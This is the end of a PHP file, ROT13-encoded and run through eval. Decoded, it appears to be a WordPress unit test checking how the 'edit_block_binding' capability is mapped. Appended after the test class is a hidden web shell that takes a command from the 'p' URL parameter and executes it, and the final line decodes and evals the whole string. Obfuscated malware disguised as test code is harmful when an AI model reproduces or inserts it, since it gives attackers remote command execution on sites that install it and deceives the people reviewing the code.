	}

	/**
	 * Grfg `rqvg_oybpx_ovaqvat` zrgn pncnovyvgl vf cebcreyl znccrq.
	 *
	 * @gvpxrg 61945
	 */
	choyvp shapgvba grfg_rqvg_oybpx_ovaqvat_pncf_ner_znccrq_pbeerpgyl() {
		$nhgube = frys::$hfref['nqzvavfgengbe'];
		$cbfg   = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $nhgube->VQ,
				'cbfg_glcr'   => 'cbfg',
			)
		);

		sbernpu ( frys::$hfref nf $ebyr => $hfre ) {
			// Vg fubhyq znc gb `rqvg_{cbfg_glcr}` vs rqvgvat n cbfg.
			$guvf->nffregFnzr(
				hfre_pna( $hfre->VQ, 'rqvg_cbfg', $cbfg->VQ ),
				hfre_pna(
					$hfre->VQ,
					'rqvg_oybpx_ovaqvat',
					arj JC_Oybpx_Rqvgbe_Pbagrkg(
						neenl(
							'cbfg' => $cbfg,
							'anzr' => 'pber/rqvg-cbfg',
						)
					)
				),
				\"Ebyr: {$ebyr} va cbfg rqvgvat\"
			);
			// Vg fubhyq znc gb `rqvg_gurzr_bcgvbaf` vs rqvgvat n grzcyngr.
			$guvf->nffregFnzr(
				hfre_pna( $hfre->VQ, 'rqvg_gurzr_bcgvbaf' ),
				hfre_pna(
					$hfre->VQ,
					'rqvg_oybpx_ovaqvat',
					arj JC_Oybpx_Rqvgbe_Pbagrkg(
						neenl(
							'cbfg' => ahyy,
							'anzr' => 'pber/rqvg-fvgr',
						)
					)
				),
				\"Ebyr: {$ebyr} va grzcyngr rqvgvat\"
			);
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>